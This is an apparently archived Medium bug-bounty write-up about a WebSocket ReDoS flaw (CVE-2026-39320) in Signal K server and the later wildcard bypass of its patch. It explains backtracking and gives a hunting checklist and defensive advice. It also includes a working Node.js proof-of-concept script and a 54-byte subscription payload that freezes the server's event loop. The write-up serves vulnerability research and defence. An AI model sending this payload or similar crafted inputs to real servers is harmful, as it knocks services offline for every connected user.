# WebSocket ReDoS via Subscription Path

- **Source URL:** https://medium.com/@vashuvats/websocket-redos-via-subscription-path-an-undocumented-attack-vector-nobody-is-hunting-b8b930755815
- **Fetched from:** https://medium.com/feed/@vashuvats
- **Fetched:** 2026-11-20
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14992 (id 14992)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
*The under-hunted technique for finding subscription-handler ReDoS that takes real-time servers down.*

#### **What you’ll learn**:

What ReDoS is and why it’s uniquely brutal on WebSocket servers, the exact flawed line of code that caused CVE-2026–39320, how a nested quantifier like (\[a-z0–9:-\]+)+! produces exponential backtracking, my full proof-of-concept, the one-line class of fix (and why it’s still not quite enough), and a hunting checklist for finding WebSocket ReDoS in the wild and tips for Defender as well.

### Quick answers

#### What is CVE-2026–39320?

An unauthenticated WebSocket ReDoS vulnerability in Signal K server versions before 2.25.0. User-controlled subscription strings are converted into regex patterns without proper escaping, allowing attackers to trigger catastrophic backtracking and crash the server by consuming 100% CPU.

#### What is a WebSocket ReDoS attack?

An attacker sends a WebSocket message that triggers a computationally expensive regex. In Node.js, this blocks the single-threaded event loop, disrupting all connections and taking the server offline.

#### Why does a nested quantifier like (\[a-z0-9:-\]+)+! freeze the server?

Nested quantifiers create exponentially many possible character combinations. When the expected ! is missing, the regex engine exhaustively tests possible matches, potentially performing billions of operations and blocking the event loop.

#### How do I find ReDoS in other WebSocket applications?

Look for user-controlled input passed into new RegExp() or matched against complex patterns with nested or adjacent quantifiers. Common targets include subscription filters, topic matching, chat filters and routing logic. Tools like **Recheck** and **CodeQL's** js/redos can help identify vulnerable patterns.

### Part 1 — What ReDoS actually is

Most common regex engines (JavaScript V8, Python, PCRE, Java, Ruby and .NET) use **backtracking**. When a pattern has multiple possible ways to match input, the engine tries different combinations until it finds a match or exhausts the possibilities.

The danger comes when ambiguous patterns encounter input that almost matches but ultimately fails, forcing the engine to explore every possible combination.

**1. The nested quantifier problem**

Consider the pattern / (a+)+$ / (without spaces).

It expects one or more groups of a characters until the end of the string. Now provide 20 a characters followed by !.

The engine tries different combinations:

- One group containing all 20 characters.
- Two groups: 19+1, 18+2, 1+19, etc.
- Three groups and every possible partition.
- Continues until every possible combination has been tested.

Because the number of combinations grows exponentially, even relatively short inputs can cause extreme processing delays.

**2. Polynomial backtracking**

A milder variant occurs when adjacent quantifiers can consume the same characters, such as \s\*\s\* or .\*.\*=.\*.

This typically causes quadratic or polynomial processing overhead. Unlike nested quantifiers, it often requires only a long input to trigger performance degradation.

**3. How to prevent ReDoS**

There are three main approaches:

- **Use safer regex engines:** Prefer linear-time engines like RE2 or Rust’s regex.
- **Eliminate ambiguity:** Escape or strictly validate user-controlled input.
- **Limit input length:** Enforce reasonable size limits to restrict worst-case processing.

The key takeaway: a regex that works instantly with normal input can become a denial-of-service vulnerability when given carefully crafted input.

### Part 2 — Why WebSockets make ReDoS so much worse

ReDoS is an old vulnerability class, but WebSockets dramatically increase its impact.

**1. One event loop, every connection.** Node.js executes JavaScript on a single main thread. Regex matching is synchronous, so a slow match blocks everything: WebSocket frames, HTTP requests, timers and health checks. A single malicious request can freeze the entire server.

**2. Persistent connections, shared impact.** A Node.js process can maintain thousands of WebSocket connections. Freezing its event loop stalls all of them. If heartbeats time out, clients may reconnect simultaneously, creating a reconnect stampede.

**3. Almost no cost to send.** Unlike HTTP, WebSockets require a TCP/TLS handshake only once. After connection, an attacker can send tiny messages without repeatedly paying that overhead. Per-message rate limiting is also frequently overlooked.

**4. Often before authentication.** Real-time applications commonly allow anonymous subscriptions to public data streams. CVE-2026–39320 affects precisely this kind of unauthenticated subscription endpoint in Signal K.

**5. Difficult to detect.** WAFs and access logs typically capture the initial HTTP Upgrade request, not individual WebSocket frames. Malicious payloads inside those frames can therefore escape traditional request-level monitoring.

**The result:** An unauthenticated attacker can send a tiny payload, freeze the event loop and disrupt every connected user with a single message.

### Part 3 — The bug: one shortcut in subscriptionmanager.ts

Signal K is an open marine data standard and server — it aggregates GPS, AIS, depth, wind and engine data from a boat’s instruments and streams it to apps over a WebSocket API. Clients subscribe to the data they care about using a path-and-context filter. For example, “send me everything under navigation.\* for vessels.self."

To support those wildcards, the server turns each subscription string into a regular expression. Here is the pre-patch code, verbatim from src/subscriptionmanager.ts at tag v2.24.0:

// Path subscriptions (v2.24.0)

function pathMatcher(path: string = '\*') {

const pattern = path.replace(/\./g, '\\.').replace(/\\\*/g, '.\*')

const matcher = new RegExp('^' + pattern + '$')

return (aPath: string) => matcher.test(aPath)

}

// Context subscriptions (v2.24.0), the string branch

if (isString(subscribeCommand.context)) {

const pattern = subscribeCommand.context

.replace(/\./g, '\\.') // escape dots

.replace(/\\\*/g, '.\*') // turn wildcard \* into regex .\*

const matcher = new RegExp('^' + pattern + '$') // ← user input compiled into a live regex

return (normalizedDeltaData: WithContext) =>

matcher.test(normalizedDeltaData.context) || /\* ... \*/

}

Look at what the escaping does — and, crucially, what it *doesn’t*. It replaces . with \. so literal dots don't act as "any character," and it turns the wildcard \* into .\* so wildcards work. That's it. Every other regex metacharacter — +, (, ), \[, \], ?, {, }, |, ^, $ — passes straight through into new RegExp().

This is the entire vulnerability. The developer thought of context as a *glob* (a simple wildcard string). But the code treats it as a *regex*. Those are two different languages, and the gap between them is attacker-controlled. Compiling untrusted input into a regex is, security-wise, in the same family as eval() on untrusted input: you have handed the user a small programming language and asked them to be polite.

The attacker’s move is now obvious: supply a context that *is* a catastrophic regex.

### Part 4 — From one subscription string to a frozen server

To weaponize this I need a context that (1) looks like a normal subscription, (2) compiles into a catastrophic regex, and (3) is guaranteed not to match — the backtracking explosion only fires on a *failed* match. Signal K identifies vessels with long strings like vessels.urn:mrn:signalk:uuid:d384dc156010... (38+ chars of \[a-z0-9:-\]), so the payload writes itself. This context:

vessels.(\[a-z0-9:-\]+)+!

becomes, after the server escapes the dot, this regex:

^vessels\.(\[a-z0-9:-\]+)+!$

That’s a classic nested quantifier — (\[a-z0-9:-\]+)+ — wrapped around the exact character class the identifier is made of, then a literal ! the identifier lacks. The engine eats the whole 38-character identifier, fails to find !, and backs up to try *every possible way* to split those characters between the inner and outer +. That's on the order of 2^n attempts — exponential, so each extra character roughly doubles the work. Measured on Node v22 (same-shape regex against vessels. + *n* filler chars): 18 chars → 8 ms, 22 → 20 ms, 24 → 79 ms, 26 → 313 ms. Two more characters, four times the time — a real 38-character UUID is firmly in "blocked until the process dies" territory, and nothing caps the input length.

The proof of concept polls the HTTP API every second to measure responsiveness, then opens one WebSocket and fires the single subscription. When the event loop freezes, the poller flips to timeouts:

```
const WebSocket = require('ws');
const http = require('http');
const HOST = 'localhost';
const PORT = 3000;
const WS_URL = `ws://${HOST}:${PORT}/signalk/v1/stream?subscribe=none`;
// Poll the API to measure real event-loop responsiveness
const HTTP_URL = `http://${HOST}:${PORT}/signalk/v1/api/`;
let requestCount = 0;
function checkServerStatus() {
  const startTime = Date.now();
  const reqId = ++requestCount;
  const req = http.get(HTTP_URL, (res) => {
    let size = 0;
    res.on('data', (chunk) => { size += chunk.length; });
    res.on('end', () => {
      const latency = Date.now() - startTime;
      console.log(`[HTTP #${reqId}] API responded in ${latency}ms`);
    });
  });
  req.on('error', () => console.log(`[HTTP #${reqId} ERROR] Connection refused/dropped.`));
  // If the event loop is blocked, this fires
  req.setTimeout(2000, () => {
    console.log(`[HTTP #${reqId} TIMEOUT] Server is Unresponsive! (Event loop is blocked)`);
    req.destroy();
  });
}
console.log('[+] Starting baseline HTTP polling...');
const pollInterval = setInterval(checkServerStatus, 1000);
// After a short baseline, launch the ReDoS
setTimeout(() => {
  console.log('\n[!] Initiating WebSocket connection to launch ReDoS...');
  const ws = new WebSocket(WS_URL);
  ws.on('open', () => {
    // After the server's `.`/`*` substitution this becomes:
    //   ^vessels\.([a-z0-9:-]+)+!$
    // tested against `vessels.urn:mrn:signalk:uuid:...` → no trailing `!` → catastrophic backtracking
    const pocPayload = {
      context: 'vessels.([a-z0-9:-]+)+!',
      announceNewPaths: true,
      subscribe: [{ path: '*' }],
    };
    ws.send(JSON.stringify(pocPayload));
    console.log('[!] Payload sent. Watch the HTTP pollers now...\n');
  });
  ws.on('error', (err) => console.error(`[-] WebSocket Error: ${err.message}`));
}, 3500);
setTimeout(() => { clearInterval(pollInterval); process.exit(0); }, 15000);
```
The payload itself is 54 bytes:

`{"context":"vessels.([a-z0-9:-]+)+!","announceNewPaths":true,"subscribe":[{"path":"*"}]}`
### What it looks like

Baseline: the API answers in tens of milliseconds. The instant the payload lands, the event-loop pollers flip to TIMEOUT and stay there:

And on the server side, docker stats shows one core pinned flat:

No authentication. No second packet. The process stays frozen until someone kills it — and a supervisor that restarts it just hands the attacker a fresh target.

### Part 5 — The fix that wasn’t: one vulnerability, two rounds

**1. The first patch (v2.25.0)**

Signal K fixed CVE-2026–39320 by escaping previously unhandled regex metacharacters:

`.replace(/[\\^$+?()[\]{}|]/g, '\\$&')`
This prevented attackers from injecting nested quantifiers through + and (). However, the \* wildcard remained intentionally supported and was still converted into an unbounded .\*.

**2. The second vulnerability (GHSA-qf2w-mm2p-jmg9)**

Researchers exploited that remaining wildcard functionality by supplying repeated wildcard patterns:

\*a\*a\*a\*a\*a... (30 repetitions)

These became chained .\* expressions, creating another catastrophic-backtracking vulnerability and testing on Node.js v22 showed exponential growth.

**3. The bigger lesson**

One file, two High-severity ReDoS vulnerabilities:

- **CVE-2026–39320:** Injected regex operators; addressed in v2.25.0.
- **GHSA-qf2w-mm2p-jmg9:** Abused unrestricted wildcards; addressed in v2.37.0.

Escaping metacharacters fixed the original attack, but not the underlying design flaw: untrusted input was still being compiled into an unrestricted, backtracking regex.

The real solutions are to constrain matching complexity, limit input size and avoid backtracking engines for untrusted patterns.

### Part 6— How to hunt WebSocket ReDoS yourself

This is the section you came for if you’re a researcher. Here’s the exact method, generalized from how I found CVE-2026–39320 and how McLaughlin found the library bugs.

#### Step 1 — Map where message content meets a regex

Open the target’s source and search for the two dangerous shapes:

- User input compiled into a regex. Grep for new RegExp( and RegExp( and trace the argument back. If any part of it comes from a WebSocket message (a subscription, a filter, a topic, a search term, a path), you have a candidate. This is the strongest finding because the attacker controls the *pattern itself*.

\# JS/TS

grep -rnE "new RegExp\(|RegExp\(" src/ | grep -v node\_modules

- A static regex run against message content. Grep for .test(, .match(, .replace(, .exec(, .split( where the subject is attacker-controlled, then inspect each *pattern* for the vulnerable shapes below.

#### Step 2 — Recognize the vulnerable regex shapes

You’re looking for ambiguity. Red flags, roughly worst to mildest:

- Nested quantifiers: (X+)+, (X\*)\*, (X+)\* — exponential. (This was mine.)
- Overlapping alternation under a quantifier: (a|a)\*, or (\\.|\[^"\])\* where both branches can eat the same byte — exponential. (This was websocket-extensions.)
- Adjacent quantifiers over the same class: \s\*\s\*, .\*.\*, \*, \*, \d+\d+ — quadratic. (This was ws and the fresh/forwarded modules.)
- A quantified group followed by something that often fails: \[^=\]+=, (...)+$, (...)+! — the trailing token forces the failure that triggers the backtracking.
- User input interpolated into a pattern with no escaping — the whole game, because the attacker supplies the ambiguity.

#### Step 3 — Craft the failing input

The explosion only happens on a *failed* match, so:

1. Build input that matches the ambiguous/quantified part for as long as possible (a long run of the relevant character class),
2. Then append one character that makes the overall match fail (the missing delimiter, the wrong trailing byte).

For CVE-2026–39320 that was “a long UUID-shaped string the quantifier loves, missing the trailing !." Generalize: find what the regex *wants*, give it a lot of that, then deny it the ending.

#### Step 4 — Prove it safely and measure it

Don’t eyeball it — measure the event loop, because that’s the real impact on a WebSocket server:

- Keep a cheap heartbeat running (an HTTP poll, or Node’s own perf\_hooks.monitorEventLoopDelay()), send the payload, and show the heartbeat stalling. That's exactly what my PoC does, and it's far more convincing in a report than "the regex is slow."
- Confirm the regex locally in isolation first (time it against increasing input lengths; a clean exponential/quadratic curve is your evidence), *then* demonstrate against a local instance you control. Never test someone else’s production server — a successful ReDoS is a real outage.

#### Step 5 — Let the tools help

- [recheck](https://www.npmjs.com/package/recheck-cli) (npx recheck-cli) — the best current JS/TS ReDoS checker; it returns the complexity class *and* an attack string.
- CodeQL js/redos / js/polynomial-redos — great in CI; this is the query that found the Rocket.Chat ReDoS (CVE-2021-32832).
- eslint-plugin-security (detect-unsafe-regex) — cheap inline linting for obvious cases.
- RegexStaticAnalysis / rxxr2 / ReScue — the academic tools for mass-scanning harvested regexes, if you want to go hunting across many packages the way McLaughlin did.
- Dependency scanners (npm audit, Snyk, Dependabot, OSV-Scanner) for the *library* half — necessary but, as we saw, blind to your own app code.

### Part 7— Fixing and defending (for the blue team)

If you *build* real-time apps, here’s the defensive ladder, best first:

1. Never compile untrusted input into a regex. If a client sends a filter/topic/path, match it with glob or string logic, not new RegExp(userInput). Treat new RegExp on user input like eval.
2. Escaping metacharacters is necessary but — on its own — provably not enough. Signal K’s 2.25.0 fix (.replace(/\[\\^$+?()\[\\\]{}|\]/g, '\\$&')) was correct and still got bypassed three weeks later through the one metacharacter it couldn't escape (the \* wildcard). If your feature rewrites a user token into a quantifier, escaping the *other* characters doesn't save you. Treat escaping as a floor, not the fix.
3. Cap complexity, not just characters. Limit how many wildcards / quantifier-generating tokens a single input may contain, and cap total input length. Limit WebSocket message size too (ws has a maxPayload option). This is the step that would have stopped *both* Signal K bugs, and it's the one the escaping patch skipped.
4. Use a non-backtracking engine for untrusted matching. node-re2 (RE2 bindings) for Node; Rust's regex, Go's regexp, or .NET's RegexOptions.NonBacktracking. They physically cannot backtrack catastrophically — which makes the whole "did I escape everything?" question moot.
5. Put a time budget on matching and run risky matches off the main thread (a worker) so one bad match can’t freeze the whole process; drop the connection on overrun.
6. Authenticate and rate-limit before the expensive parsing, both per-connection and per-message.
7. Monitor the event loop in production. perf\_hooks.monitorEventLoopDelay() and alert on sustained lag. It's the one signal that catches the ReDoS you missed in review — and the one your WAF will never see.

### Sources & references

- CVE-2026–39320 (my 0-day): GitHub Advisory [GHSA-7gcj-phff-2884](https://github.com/SignalK/signalk-server/security/advisories/GHSA-7gcj-phff-2884) · NVD CVE-2026–39320 · signalk-server source at [v2.24.0](https://raw.githubusercontent.com/SignalK/signalk-server/v2.24.0/src/subscriptionmanager.ts) (vulnerable) and [v2.25.0](https://raw.githubusercontent.com/SignalK/signalk-server/v2.25.0/src/subscriptionmanager.ts) (fixed)
- The sequel — chained-wildcard ReDoS (same file, post-patch): [GHSA-qf2w-mm2p-jmg9](https://github.com/SignalK/signalk-server/security/advisories/GHSA-qf2w-mm2p-jmg9) (High, CVSS 7.5, CWE-1333; reported by zx / manus-use; published 7 Nov 2026; affected ≤ 2.34.0, patched 2.37.0)
- ws CVE-2021-32640: [GHSA-6fc8-4gx4-v693](https://github.com/websockets/ws/security/advisories/GHSA-6fc8-4gx4-v693) · [fix commit](https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff)
- websocket-extensions CVE-2020-7662 / 7663: [jcoglan's write-up](https://blog.jcoglan.com/2020/06/02/redos-vulnerability-in-websocket-extensions) · [Snyk](https://snyk.io/blog/regular-expression-denial-of-service-in-websocket-extensions) · [one-character fix](https://github.com/faye/websocket-extensions-node/commit/3dad4ad44a8c5f74d4f8f4efd3f9d6e0b5df3051)
- “Freezing the Web” (Staicu & Pradel, USENIX Security 2018): [paper](https://www.usenix.org/conference/usenixsecurity18/presentation/staicu) · [PDF](https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-staicu.pdf)
- Rocket.Chat CVE-2021–32832 (CodeQL-found ReDoS): [GitHub Security Lab GHSL-2020–310](https://securitylab.github.com/advisories/GHSL-2020-310-redos-Rocket.Chat/)
- V8 non-backtracking regexp engine: [v8.dev blog](https://v8.dev/blog/non-backtracking-regexp)
- Tooling: [recheck](https://www.npmjs.com/package/recheck-cli) · CodeQL js/redos (GitHub Security Lab) · [node-re2](https://github.com/uhop/node-re2)
- Gemini is used to create the images .

[WebSocket ReDoS via Subscription Path: An Undocumented Attack Vector Nobody Is Hunting](https://meetcyber.net/websocket-redos-via-subscription-path-an-undocumented-attack-vector-nobody-is-hunting-b8b930755815) was originally published in [MeetCyber](https://meetcyber.net) on Medium, where people are continuing the conversation by highlighting and responding to this story.
